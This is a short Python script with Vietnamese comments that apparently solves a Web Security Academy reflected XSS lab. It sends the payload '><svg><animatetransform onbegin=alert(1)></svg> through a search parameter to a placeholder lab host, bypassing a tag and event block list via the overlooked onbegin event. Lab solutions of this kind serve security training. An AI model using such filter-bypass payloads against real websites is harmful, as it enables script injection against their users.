# # Vẫn là câu chuyện chặn các tag để bảo vệ
# # Tuy nhiên sau khi scan thì có vẻ như web đã để lại 1 vài tag và trong đó chúng ta sẽ sử dụng svg và animatetransform để tạo payload tấn công
# # web cũng chặn các event mà đã bỏ quên mất event onbegin
# # payload tấn công
# "><svg><animatetransform onbegin=alert(1)>

import requests

burp0_url = "https://YOUR_HOST.h1-web-security-academy.net:443"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
    "Accept-Language": "en-US,en;q=0.5", 
    "Accept-Encoding": "gzip, deflate, br", 
    "Upgrade-Insecure-Requests": "1", 
    "Sec-Fetch-Dest": "document", 
    "Sec-Fetch-Mode": "navigate", 
    "Sec-Fetch-Site": "same-origin", 
    "Sec-Fetch-User": "?1", 
    "Priority": "u=0, i", 
    "Te": "trailers", 
    "Connection": "keep-alive"
}
requests.get(burp0_url, headers=burp0_headers, params={"search" : "'><svg><animatetransform onbegin=alert(1)></svg>"})